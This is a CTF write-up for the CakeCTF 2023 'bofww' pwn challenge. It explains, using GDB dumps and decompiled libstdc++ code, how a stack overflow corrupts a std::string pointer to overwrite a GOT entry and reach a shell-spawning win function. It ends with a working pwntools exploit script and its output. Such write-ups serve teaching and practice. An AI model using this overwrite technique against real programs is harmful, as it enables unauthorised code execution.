# bofww

> Author: ptr-yudai<br>
> Description: buffer overflow with win function<br>
> Attachment: [bofww.tar.gz](https://raw.githubusercontent.com/d0UBleW/ctf/main/cake-ctf/pwn/bofww/bofww.tar.gz)<br>

<div class="hidden">
    <details>
        <summary>Keywords</summary>
        CakeCTF 2023, pwn, bof, cpp
    </details>
</div>

## TL;DR

Buffer overflow into arbitrary address write via `std::string` `operator=`

## Source Code

```cpp
#include <iostream>

void win() {
  std::system("/bin/sh");
}

void input_person(int& age, std::string& name) {
  int _age;
  char _name[0x100];
  std::cout << "What is your first name? ";
  std::cin >> _name;
  std::cout << "How old are you? ";
  std::cin >> _age;
  name = _name;
  age = _age;
}

int main() {
  int age;
  std::string name;
  input_person(age, name);
  std::cout << "Information:" << std::endl
            << "Age: " << age << std::endl
            << "Name: " << name << std::endl;
  return 0;
}

__attribute__((constructor))
void setup(void) {
  std::setbuf(stdin, NULL);
  std::setbuf(stdout, NULL);
}
```

```console
$ checksec --file ./bofww
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Initial Analysis

There is an obvious buffer overflow on `input_person()`, specifically the `_name`
variable. However, the program is compiled with stack protector and we might
need to leak the stack cookie for us to smash the stack. Unfortunately, I could
not find any way to leak the cookie and gain another round of buffer overflow.
Luckily, the program global offset table (GOT) entries are overwritable. Moreover,
there is a win function which would pop us a shell; hence, the plan is to
overwrite `__stack_chk_fail` GOT entry to be the address of `win()` function.

But, how do we overwrite the GOT, you may ask? Well, in short, we overwrite the
`std::string` structure which contains pointer to a memory address in which
the actual string content lives. Guess, this is a good excuse to dive into
`libstdc++6` (`cxx11`) `std::string` internals to better understand how our exploit
works. Then, we would walkthrough the `operator=` function to better craft our
exploit. If you are just here for the final solve script, you can skip to this
[section](#solution).

## `std::string` Brief Internals

Let's try to play with the program through GDB. First, set a breakpoint at `input_person+164`,
which is the just before `name = _name` line of code is executed. Next, run
the program and input any short name, in this example, the input would be `aaaabaaa`
for `_name`, and any number for `_age`.

```console
gef> break *input_person+164
gef> run
gef> info reg rdi
rdi            0x7fffffffcde0      0x7fffffffcde0
gef> ni
gef> tele 0x7fffffffcde0
0x7fffffffcde0|+0x0000|+000: 0x00007fffffffcdf0  ->  'aaaabaaa'  <-  $rax
0x7fffffffcde8|+0x0008|+001: 0x0000000000000008
0x7fffffffcdf0|+0x0010|+002: 'aaaabaaa'  <-  $rdi
0x7fffffffcdf8|+0x0018|+003: 0x0000000000000000
0x7fffffffce00|+0x0020|+004: 0x0000000000000000
0x7fffffffce08|+0x0028|+005: 0xa7306dc9e85ed800  <-  canary
```

We could try to supply another input, for example `aaaabaaacaaaa`, and inspect the
memory.

```console
0x7fffffffcde0|+0x0000|+000: 0x00007fffffffcdf0  ->  'aaaabaaacaaa'  <-  $rax
0x7fffffffcde8|+0x0008|+001: 0x000000000000000c ('\x0c'?)
0x7fffffffcdf0|+0x0010|+002: 'aaaabaaacaaa'  <-  $rdi
0x7fffffffcdf8|+0x0018|+003: 0x0000000061616163 ('caaa'?)
0x7fffffffce00|+0x0020|+004: 0x0000000000000000
0x7fffffffce08|+0x0028|+005: 0xdea7b9a5dde5b200  <-  canary
```


We could see from the two examples how `std::string` is represented on the stack
and sort of guess that:

| offset | data |
|------- | ---- |
| 0x00   | pointer to the string content   |
| 0x08   | length of the string content   |
| 0x10   | the actual string content   |

Looks like the structure could hold up to either `0x10` or `0x18` bytes of
characters (including the `NULL` termination byte) on the stack. Let's try to
provide `0x10` bytes of input and see how it reacts.

```console
0x7fffffffcde0|+0x0000|+000: 0x00000000004172b0  ->  'aaaaaaaabaaaaaaa'  <-  $rax
0x7fffffffcde8|+0x0008|+001: 0x0000000000000010
0x7fffffffcdf0|+0x0010|+002: 0x000000000000001e  <-  $rdi
0x7fffffffcdf8|+0x0018|+003: 0x0000000000000000
0x7fffffffce00|+0x0020|+004: 0x0000000000000000
0x7fffffffce08|+0x0028|+005: 0xc382c9256963b300  <-  canary
```

As could be seen, our string is now allocated on the heap.

Since there is a pointer to a memory address, we could probably overwrite this
value with our buffer overflow and point it to `__stack_chk_fail@got.plt`.

```python
payload = b""
payload += p64(win)
payload = payload.ljust(0x130, b"\x00")
payload += p64(stack_chk_fail_got)
```

With this payload, we actually got a `SIGSEGV` and looking at the call stack,
it is trying to call `free` which hints us on `operator=` trying to allocate
our input on the heap. However, our input is only 3 bytes long as `NULL` bytes
are not counted. This is weird. Guess, this is a perfect time to look at how
`operator=` works.

```console
 -> 0x7fdbf5c3d8d7 498b4608           <_int_free+0x1b7>   mov    rax, QWORD PTR [r14 + 0x8]
[!] Cannot access memory at address 0x8050d8
[Thread Id:1] Name: "bofww", stopped at 0x7fdbf5c3d8d7 <_int_free+0x1b7>, reason: SIGSEGV
[#0] 0x7fdbf5c3d8d7 <_int_free+0x1b7>
[#1] 0x7fdbf5c404d3 <free+0x73> (frame name: __GI___libc_free)
[#2] 0x7fdbf5f4182d <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_mutate(unsigned long, unsigned long, char const*, unsigned long)+0xed>
[#3] 0x7fdbf5f4288b <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_replace(unsigned long, unsigned long, char const*, unsigned long)+0xfb>
[#4] 0x0000004013b9 <input_person(int&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&)+0xa9>
[#5] 0x000000000000 <NO_SYMBOL>
```

## Understanding `operator=(const char *)`

Unfortunately, I could not find the `libstdc++` source code for the `operator=`
function (skill issue, probably) and had to instead use `ghidra` to decompile
the file.

To easily locate the function address, turn off demangling inside GDB (if you
have it turned on) and use the mangled function name `_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc`
as the search filter.

```console
gef> set print asm-demangle off
gef> x/i 0x00000000004013b4
0x4013b4 <_Z12input_personRiRNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+164>:      call   0x4011a0 <_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc@plt>
```

The following is the decompiled code for `operator=(const char *)`. As could be
seen, there is a familiar function named `_M_replace()`. It accepts:

- the `std::string` structure as the first parameter, 
- index as the second parameter
- current string length (offset `0x08`) as the third parameter
- pointer to the new string content as the fourth parameter
- and lastly, the length of the new string

```c
void __thiscall
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=
          (basic_string<char,std::char_traits<char>,std::allocator<char>> *this,char *new_str)

{
  size_t new_len;
  
  new_len = strlen(new_str);
  _M_replace(this,0,*(ulong *)(this + 8),new_str,new_len);
  return;
}
```

Looking into `_M_replace()`, there is the `_M_mutate()` function which causes the
`SIGSEGV`. To avoid calling `_M_mutate()`, `capacity`, which is the value at
offset `0x10` (since we overwrote `ptr` and now `ptr != this+0x10`), needs to be
larger than our input length. Since we have buffer overflow, we could control
the value at offset `0x10` as well which make the program goes into the `else`
block and finally execute the `memcpy()` function, where the destination is
the overwritten `ptr` value plus index (which is always `0`) and the source is
our input value.

```c
basic_string<char,std::char_traits<char>,std::allocator<char>> * __thiscall
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::_M_replace
          (basic_string<char,std::char_traits<char>,std::allocator<char>> *this,ulong index,
          ulong cur_size,char *new_str,ulong new_len)

{
  basic_string<char,std::char_traits<char>,std::allocator<char>> *__dest;
  ulong _new_len;
  ulong capacity;
  ulong idk;
  long _cur_size;
  basic_string<char,std::char_traits<char>,std::allocator<char>> *ptr;
  
  _cur_size = *(long *)(this + 8);
  if (new_len <= (cur_size + 0x3fffffffffffffff) - _cur_size) {
    ptr = *(basic_string<char,std::char_traits<char>,std::allocator<char>> **)this;
    _new_len = (new_len - cur_size) + _cur_size;
    if (ptr == this + 0x10) {
                    /* inline string (on stack) */
      capacity = 0xf;
    }
    else {
      capacity = *(ulong *)(this + 0x10);
    }
    if (capacity < _new_len) { // <=== avoid this
      _M_mutate(this,index,cur_size,new_str,new_len);
    }
    else {
      __dest = ptr + index;
      idk = _cur_size - (index + cur_size);
      if ((new_str < ptr) || (ptr + _cur_size < new_str)) {
        if ((idk != 0) && (cur_size != new_len)) {
          if (idk == 1) {
            __dest[new_len] = __dest[cur_size];
          }
          else {
            memmove(__dest + new_len,__dest + cur_size,idk);
          }
        }
        if (new_len != 0) {
          if (new_len == 1) {
            *__dest = (basic_string<char,std::char_traits<char>,std::allocator<char>>)*new_str;
          }
          else {
            memcpy(__dest,new_str,new_len); // <=== target
          }
        }
      }
      else {
        _M_replace_cold(this,(char *)__dest,cur_size,new_str,new_len,idk);
      }
    }
    *(ulong *)(this + 8) = _new_len;
    *(undefined *)(*(long *)this + _new_len) = 0;
    return this;
  }
                    /* WARNING: Subroutine does not return */
  __throw_length_error("basic_string::_M_replace");
}
```

## Solution

Let's briefly recap on our analysis:

- `input_person()` function is subjected to buffer overflow
- `std::string` contains a pointer to memory address at offset `0x00`
- this pointer could be overwritten w/ buffer overflow to point to `__stack_chk_fail@got.plt` and our input would be used to populate this GOT entry
- simply overwriting this pointer is not enough as the `operator=` function calls into `_M_mutate()` which causes segmentation fault
- need to overwrite `std::string` structure at offset `0x10` to be larger than our input length (calculated with `strlen`) to avoid the `_M_mutate()` function calls

```python
#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bofww", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc bofww.2023.cakectf.com 9002"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

win = 0x4012f6
stack_chk_fail_got = elf.got["__stack_chk_fail"]
payload = b""
payload += p64(win)
payload = payload.ljust(0x130, b"\x00")
payload += flat(
    stack_chk_fail_got,
    0,
    0x3  # std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_replace(unsigned long, unsigned long, char const*, unsigned long)+0x4a --> need to be >= strlen(_name)  # noqa
)
io.sendline(payload)
io.sendline(b"1337")

io.interactive()
```

```console
$ ./solve.py
[*] Switching to interactive mode
What is your first name? How old are you? $ ls
Dockerfile  docker-compose.yml    libstdc++.so.6.0.32  readme.md
bofww        flag.txt        main.cpp         solve.py
$ cat flag.txt
CakeCTF{n0w_try_w1th0ut_w1n_func710n:)}
$
```
